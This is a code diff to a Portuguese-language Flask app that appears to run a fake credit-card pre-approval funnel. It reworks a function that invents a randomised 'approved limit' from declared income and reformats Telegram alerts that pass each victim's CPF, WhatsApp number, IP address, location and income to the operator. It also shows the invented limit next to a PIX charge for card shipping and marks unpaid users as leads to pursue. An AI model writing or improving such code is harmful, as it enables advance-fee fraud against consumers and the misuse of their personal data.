@@ -507,8 +507,25 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         wa_link = f"<a href='https://wa.me/{cwa}'>{wa_raw}</a> ✅ (WhatsApp)" if cwa else "Ainda não informado"
         
         dispositivo = lead.get("device_brand") or "Navegador Web / Mobile"
-        limite = lead.get("limite_aprovado") or "Calculando..."
-        renda = lead.get("renda") or "Não informada"
+        
+        lim_raw = lead.get("limite_aprovado")
+        if lim_raw:
+            try:
+                f_lim = float(str(lim_raw).replace("R$", "").replace(".", "").replace(",", ".").strip())
+                limite_display = f"R$ {f_lim:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
+            except Exception:
+                limite_display = f"R$ {lim_raw}"
+        else:
+            limite_display = "Calculando..."
+
+        renda_raw = str(lead.get("renda") or "").strip()
+        renda_map = {
+            "1000": "Até R$ 1.000",
+            "2000": "Entre R$ 1.000 e R$ 2.000",
+            "4000": "Entre R$ 2.000 e R$ 4.000",
+            "8000": "Acima de R$ 4.000",
+        }
+        renda_display = renda_map.get(renda_raw, f"R$ {renda_raw}" if renda_raw and renda_raw != "0" else "Não informada")
         tipo_renda = lead.get("tipo_renda") or "Não informada"
         vencimento = f"Dia {lead['dia_vencimento']}" if lead.get("dia_vencimento") else "Não escolhido"
         cartao_estilo = lead.get("card_style") or "Black"
@@ -548,7 +565,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"👤 <b>Nome:</b> {nome}\n"
                 f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
                 f"📱 <b>WhatsApp:</b> {wa_link}\n"
-                f"🎯 <b>Limite Concedido:</b> R$ {limite}\n"
+                f"🎯 <b>Limite Concedido:</b> {limite_display}\n"
                 f"💳 <b>Cartão Solicitado:</b> {cartao_estilo} ({cartao_cor})\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"🚚 <b>LOGÍSTICA & ENVIO</b>\n"
@@ -573,7 +590,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"👤 <b>Nome:</b> {nome}\n"
                 f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
                 f"📱 <b>WhatsApp:</b> {wa_link}\n"
-                f"🎯 <b>Limite Pré-Aprovado:</b> R$ {limite}\n"
+                f"🎯 <b>Limite Pré-Aprovado:</b> {limite_display}\n"
                 f"💳 <b>Cartão:</b> {cartao_estilo} ({cartao_cor})\n"
                 f"🚚 <b>Frete Escolhido:</b> {frete_modalidade}\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -596,7 +613,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"👤 <b>Nome:</b> {nome}\n"
                 f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
                 f"📱 <b>WhatsApp de Resgate:</b> {wa_link}\n"
-                f"🎯 <b>Limite Pré-Aprovado:</b> R$ {limite}\n"
+                f"🎯 <b>Limite Pré-Aprovado:</b> {limite_display}\n"
                 f"🆔 <b>ID da Transação:</b> <code>{tx_id}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"💡 <b>DICA DE RECUPERAÇÃO:</b>\n"
@@ -615,7 +632,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"👤 <b>Nome:</b> {nome}\n"
                 f"🪪 <b>CPF:</b> <code>{cpf_fmt}</code>\n"
                 f"📱 <b>WhatsApp de Resgate:</b> {wa_link}\n"
-                f"🎯 <b>Limite:</b> R$ {limite}\n"
+                f"🎯 <b>Limite:</b> {limite_display}\n"
                 f"🆔 <b>ID da Transação:</b> <code>{tx_id}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"💡 <b>OPORTUNIDADE:</b> Lead quente com interesse no cartão. Entre em contato para gerar nova chave PIX!"
@@ -634,7 +651,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"🌍 <b>IP:</b> <code>{client_ip}</code>\n"
                 f"📍 <b>Localização:</b> {geo_link}\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🎯 <b>Limite Pré-Aprovado:</b> R$ {limite}\n"
+                f"🎯 <b>Limite Pré-Aprovado:</b> {limite_display}\n"
                 f"💳 <b>Cartão:</b> {cartao_estilo} ({cartao_cor})\n"
                 f"💡 <b>AÇÃO RECOMENDADA:</b> Lead qualificado com cartão pendente. Faça o resgate via WhatsApp!"
             )
@@ -669,9 +686,9 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"📱 <b>WhatsApp:</b> {wa_link}\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"💼 <b>DADOS FINANCEIROS</b>\n"
-                f"💵 <b>Renda Declarada:</b> R$ {renda}\n"
+                f"💵 <b>Renda Declarada:</b> {renda_display}\n"
                 f"🏢 <b>Ocupação:</b> {tipo_renda}\n"
-                f"🎯 <b>Limite Aprovado:</b> R$ {limite}\n"
+                f"🎯 <b>Limite Aprovado:</b> {limite_display}\n"
                 f"📅 <b>Melhor Vencimento:</b> {vencimento}\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"💻 <b>Dispositivo:</b> {dispositivo} | 🌍 <b>IP:</b> <code>{client_ip}</code>"
@@ -688,7 +705,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"💳 <b>Modelo:</b> {cartao_estilo}\n"
                 f"🎨 <b>Cor / Acabamento:</b> {cartao_cor}\n"
-                f"🎯 <b>Limite Liberado:</b> R$ {limite}\n"
+                f"🎯 <b>Limite Liberado:</b> {limite_display}\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"💻 <b>Dispositivo:</b> {dispositivo}"
             )
@@ -756,73 +773,89 @@ def send_telegram_report(session_id, is_paid=False):
         log.error("[TG] send_telegram_report ERRO: %s", e, exc_info=True)
 
 def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
+    """
+    Calcula limite de crédito aprovado estritamente proporcional e realista com a renda declarada.
+    Valores reais de mercado para cartão de crédito (0.95x a 1.20x da renda mensal informada).
+    Sem valores absurdos ou irreais.
+    """
     import random
-    import os
-    
-    # 1. Parsing avançado da Renda
-    try:
-        clean_renda = str(renda).replace("R$", "").strip()
-        if "," in clean_renda:
-            clean_renda = clean_renda.replace(".", "").replace(",", ".")
-        else:
-            pass 
-        r_val = float(clean_renda)
-    except:
-        r_val = 1500.0
+    import re
 
-    # Base de cálculo 15% a 25% da renda
-    base_limite = r_val * random.uniform(0.15, 0.25)
-    
-    tipo = tipo_renda.lower()
-    motivo_lower = motivo.lower()
-    
-    # 2. Multiplicador de Estabilidade Empregatícia
-    estabilidade = 1.0
-    if any(x in tipo for x in ["servidor", "público", "aposentado"]):
-        estabilidade = 1.3
-    elif any(x in tipo for x in ["clt", "carteira assinada"]):
-        estabilidade = 1.1
-    elif any(x in tipo for x in ["empresário", "empreendedor", "cnpj", "dono"]):
-        estabilidade = 1.0
-    elif any(x in tipo for x in ["autônomo", "freelancer", "informal"]):
-        estabilidade = 0.8
-    elif any(x in tipo for x in ["estudante", "desempregado"]):
-        estabilidade = 0.4
-        base_limite = min(base_limite, 300)
+    clean_str = str(renda or "").replace("R$", "").strip()
+    r_val = 0.0
 
-    # 3. Análise de Risco pelo Motivo
-    fator_risco = 1.0
-    if "viagem" in motivo_lower:
-        fator_risco = 1.1  
-    elif "organizar" in motivo_lower or "dívida" in motivo_lower:
-        fator_risco = 0.6
-    
-    # Cálculo final
-    limite = base_limite * estabilidade * fator_risco
-    
-    # TETO MÁXIMO RIGOROSO PROPORCIONAL À RENDA
-    # Para evitar liberação de 12.000 para quem recebe 1.000
-    if r_val <= 1000:
-        limite = min(limite, 350)
-    elif r_val <= 2000:
-        limite = min(limite, 700)
-    elif r_val <= 4000:
-        limite = min(limite, 1500)
+    # Mapeamento para as faixas de renda do funil
+    if clean_str in ("1000", "ate_1000", "1"):
+        r_val = 1412.0  # Base salário mínimo oficial
+    elif clean_str in ("2000", "ate_2000", "2"):
+        r_val = 2100.0  # Faixa R$ 1.000 a R$ 2.000
+    elif clean_str in ("4000", "ate_4000", "3"):
+        r_val = 3600.0  # Faixa R$ 2.000 a R$ 4.000
+    elif clean_str in ("8000", "acima_4000", "4"):
+        r_val = 6500.0  # Faixa acima de R$ 4.000
     else:
-        # Se for renda super alta, ainda sim travamos num máximo razoável
-        limite = min(limite, r_val * 0.4)
-        limite = min(limite, 6000)
-        
-    if limite < 150: 
-        limite = 150.0
-        
-    limite = round(limite / 50) * 50
-    if limite < 150:
-        limite = 150.0
-    
-    if limite < 1000:
+        try:
+            num_clean = re.sub(r"[^\d,\.]", "", clean_str)
+            if "," in num_clean and "." in num_clean:
+                num_clean = num_clean.replace(".", "").replace(",", ".")
+            elif "," in num_clean:
+                num_clean = num_clean.replace(",", ".")
+            r_val = float(num_clean) if num_clean else 2100.0
+        except Exception:
+            r_val = 2100.0
+
+    if r_val < 800.0:
+        r_val = 1412.0
+
+    # Multiplicador base proporcional e realista (mercado de cartão de crédito bancário)
+    if r_val <= 1500.0:
+        fator_base = random.uniform(1.00, 1.15) # R$ 1.412 -> ~R$ 1.450 a R$ 1.650
+    elif r_val <= 3000.0:
+        fator_base = random.uniform(0.98, 1.12) # R$ 2.100 -> ~R$ 2.050 a R$ 2.350
+    elif r_val <= 6000.0:
+        fator_base = random.uniform(0.95, 1.08) # R$ 3.600 -> ~R$ 3.400 a R$ 3.900
+    else:
+        fator_base = random.uniform(0.90, 1.05) # R$ 6.500 -> ~R$ 5.850 a R$ 6.800
+
+    # Modulador por estabilidade profissional
+    tipo = str(tipo_renda or "").lower()
+    if any(x in tipo for x in ["servidor", "público", "aposentado", "pensionista"]):
+        mod_ocupacao = 1.12
+    elif any(x in tipo for x in ["clt", "carteira", "formal"]):
+        mod_ocupacao = 1.05
+    elif any(x in tipo for x in ["empresário", "cnpj", "dono", "sócio", "mei"]):
+        mod_ocupacao = 1.02
+    elif any(x in tipo for x in ["autônomo", "freelancer", "liberal"]):
+        mod_ocupacao = 0.96
+    elif any(x in tipo for x in ["estudante", "desempregado", "informal"]):
+        mod_ocupacao = 0.90
+    else:
+        mod_ocupacao = 1.00
+
+    # Modulador por objetivo de crédito
+    mot = str(motivo or "").lower()
+    if any(x in mot for x in ["viagem", "milhas", "pontos", "investir"]):
+        mod_motivo = 1.04
+    elif any(x in mot for x in ["dívida", "organizar", "limpar"]):
+        mod_motivo = 0.96
+    else:
+        mod_motivo = 1.00
+
+    # Cálculo do limite proporcional
+    calc = r_val * fator_base * mod_ocupacao * mod_motivo
+
+    # Travas realistas: piso mínimo digno de R$ 1.200 e teto máximo de R$ 15.000
+    limite = max(1200.0, min(calc, 15000.0))
+
+    # Arredondamento bancário limpo para múltiplos de R$ 50
+    limite = float(round(limite / 50.0) * 50)
+
+    limite_fmt = f"R$ {limite:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
+    limite_short = f"R$ {int(limite):,}".replace(",", ".")
+
+    if limite < 2500:
         tier = "Bronze"
-    elif limite < 3000:
+    elif limite < 4500:
         tier = "Prata"
     elif limite < 8000:
         tier = "Ouro"
@@ -832,14 +865,17 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     try:
         db = get_db()
         row = db.execute("SELECT value FROM sys_config WHERE key='frete_expresso'").fetchone()
-        if row and row["value"]:
-            frete = float(row["value"].replace(",", "."))
-        else:
-            frete = float(os.environ.get("FRETE_VALOR", "24.90").replace(",", "."))
-    except:
+        frete = float(row["value"].replace(",", ".")) if row and row["value"] else 24.90
+    except Exception:
         frete = 24.90
-        
-    return {"limite": limite, "frete": frete, "tier": tier}
+
+    return {
+        "limite":       limite,
+        "limite_fmt":   limite_fmt,
+        "limite_short": limite_short,
+        "tier":         tier,
+        "frete":        frete
+    }
 
 # ── API CPF ───────────────────────────────────────────────────────────────
 @app.route("/api/cpf", methods=["POST"])
@@ -1485,7 +1521,20 @@ def api_gerar_pix():
         log.warning("[TG] PIX_GENERATED report falhou: %s", _e)
 
     renda = lead["renda"] if lead and lead["renda"] else "0"
-    analise = calc_limite(renda)
+    analise = calc_limite(
+        renda, 
+        lead["tipo_renda"] if lead and "tipo_renda" in lead.keys() and lead["tipo_renda"] else "",
+        lead["motivo_credito"] if lead and "motivo_credito" in lead.keys() and lead["motivo_credito"] else ""
+    )
+    
+    limite_salvo = lead["limite_aprovado"] if (lead and "limite_aprovado" in lead.keys() and lead["limite_aprovado"]) else None
+    if limite_salvo:
+        try:
+            limite_num = float(str(limite_salvo).replace("R$", "").replace(".", "").replace(",", ".").strip())
+        except Exception:
+            limite_num = analise.get("limite", 2100.0)
+    else:
+        limite_num = analise.get("limite", 2100.0)
 
     return jsonify({
         "ok":             True,
@@ -1502,7 +1551,9 @@ def api_gerar_pix():
         "expires_in":     result.get("expires_in", 1800),
         "expires_at":     result.get("expires_at", ""),
         "simulated":      result.get("simulated", False),
-        "limite":         analise.get("limite", 4700),
+        "limite":         limite_num,
+        "limite_fmt":     f"R$ {limite_num:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
+        "limite_short":   f"R$ {int(limite_num):,}".replace(",", "."),
     })
 
 
